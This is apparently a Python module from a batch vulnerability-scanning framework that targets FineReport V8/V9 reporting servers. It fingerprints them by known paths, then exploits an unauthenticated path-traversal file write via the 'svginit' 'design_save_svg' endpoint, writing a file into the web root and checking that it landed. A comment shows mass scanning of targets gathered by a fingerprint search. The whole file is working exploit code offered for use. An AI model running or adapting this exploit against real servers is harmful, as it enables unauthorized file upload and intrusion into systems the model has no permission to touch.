# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-12-07 18:35

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.Report.FineReport.unauth_uploadfile -fs "app=\"帆软-FineReport\"" -cs
# ok

class Script(BaseScript):
    name = 'FineReport'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://www.cnblogs.com/0day-li/p/14637796.html'
        # 特定路径判断
        self.detect_path_list = ['/WebReport/ReportServer', '/seeyonreport/ReportServer', '/webroot/ReportServer', '/decision/login']
        # exec
        self.exec_path_list = ['/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/qqq.svg.txt',
                               '/seeyonreport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../seeyonreport/qqq.svg.txt',
                               '/webroot/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../webroot/qqq.svg.txt']
        # 相关信息
        self.info = 'FineReport V8 / V9'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'FineReport--Web Reporting Tool' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                if text is not None and '/com/fr/scripts/ui/fineui.min.js' in text:
                    self.flag = False
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml;charset=UTF-8'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '''{"__CONTENT__":"1234567890","__CHARSET__":"UTF-8"}'''
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                for test_path in ['/WebReport/qqq.svg.txt', '/seeyonreport/qqq.svg.txt', 'webroot/qqq.svg.txt']:
                    url = f'http://{self.target}{test_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{test_path}'
                    text = await AsyncFetcher.fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                    if '1234567890' in text:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass